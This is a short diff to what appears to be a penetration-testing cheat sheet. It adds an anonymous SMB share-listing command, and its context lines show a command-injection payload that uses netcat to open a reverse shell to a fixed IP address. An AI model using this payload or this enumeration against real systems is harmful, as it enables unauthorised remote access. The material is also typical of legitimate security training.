@@ -13,6 +13,11 @@
 ```bash
 ; nc 192.168.45.179 4444 -e /bin/sh; 
 ```
+## SMB Anonymous Login (No Password) Port - 445 TCP
+
+```bash
+smbclient -L //<IP>/ -N
+```
 
 ## Netcat Listener
 
